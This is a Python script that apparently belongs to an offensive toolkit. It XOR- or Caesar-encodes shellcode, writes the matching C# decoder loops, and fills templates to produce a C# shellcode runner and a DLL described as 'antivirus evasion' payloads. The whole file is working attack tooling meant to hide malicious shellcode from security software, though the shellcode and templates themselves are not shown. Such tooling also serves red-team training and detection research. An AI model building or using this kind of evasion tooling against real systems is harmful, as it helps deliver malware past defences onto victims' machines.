 #!/bin/python3
import subprocess
import socket
import random
from colorama import init
from termcolor import colored
 
init()

def read_file(f):
        with open(f, 'r') as fs:
            content = fs.read()
        return content

def shellcodeEncoder(technique, shellcode):
    # Python shellcode encoder 
    shellcode = "".join(shellcode.splitlines())
    #print(shellcode)
    start = shellcode.find("{")
    end = shellcode.find("}")
    shellcode_start = shellcode[0:start].strip()
    shellcode = shellcode[start+1:end].strip()
    shellcode_chars = shellcode.split(",") 
    shellcode_chars = list(filter(None, shellcode_chars))

    # cesar cipher encoder
    cesar_encoded_shellcode_chars = []
    for c in shellcode_chars:
        cesar_encoded_shellcode_chars.append("0x{:02x}".format(int(c,16)+2 & 0xFF))

    # xor encoder
    xor_encoded_shellcode_chars = []
    for c in shellcode_chars:
        xor_encoded_shellcode_chars.append("0x{:02x}".format(int(c,16)^0xfa & 0xFF))

    if (technique == "xor"):
        result = xor_encoded_shellcode_chars
    elif (technique == "cesar"):
        result = cesar_encoded_shellcode_chars
    #print(f"XOR shellcode: {xor_encoded_shellcode_chars}")
    
    return (shellcode_start + " {"+ ",".join(result) + "};")


def shellcodeDecoder(technique):
    if (technique == "xor"):
        text = """
            //XOR decoder
            for(int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xfa) & 0xFF);
            }
"""
    elif (technique == "cesar"):
        text = """
            //Cesar decoder
            for(int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }
"""
    return text



def generateCPayload(technique, shellcode, arch):
    '''Generating C# payload with antivirus evasion'''

    print(colored("[+] Generating C# exploit", 'green'))
    print(colored(f"    [+] {technique} Encrypting shelcode", 'white'))

    # Encoder template
    template_name = "cs_encryptor.cs"
    template = read_file("templates/" + template_name)
    template_out = template.replace("%SHELLCODE%", shellcode)
    
    f = open("output/" + template_name, 'w')
    f.write(template_out)
    f.close()

    # Python shellcode encoder  
    encoded_shellcode = shellcodeEncoder(technique, shellcode)
    shellcode_decoder = shellcodeDecoder(technique)

    #print(f"Decoder: {shellcodeDecoder("xor", encoded_shellcode)}")

    # C# shellcode runner
    template_name = "cs_antivirus_evasion.cs"
    template = read_file("templates/" + template_name)
    template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode)
    template_out = template_out.replace("%DECODER%", shellcode_decoder)
    
    f = open(f"output/{arch}/" + template_name, 'w')
    f.write(template_out)
    f.close()

def generateCDllPayload(technique, shellcode, arch):
    # C# DLL shellcode 
    # Python shellcode encoder  
    print(colored("[+] Generating C# DLL exploit", 'green'))
    print(colored(f"    [+] {technique} Encrypting shelcode", 'white'))

    encoded_shellcode = shellcodeEncoder(technique, shellcode)
    shellcode_decoder = shellcodeDecoder(technique)

    template_name = "cs_dll.cs"
    template = read_file("templates/" + template_name)
    template_out = template.replace("%ENCSHELLCODE%", encoded_shellcode)
    template_out = template_out.replace("%DECODER%", shellcode_decoder)
    
    f = open(f"output/{arch}/" + template_name, 'w')
    f.write(template_out)
    f.close()

    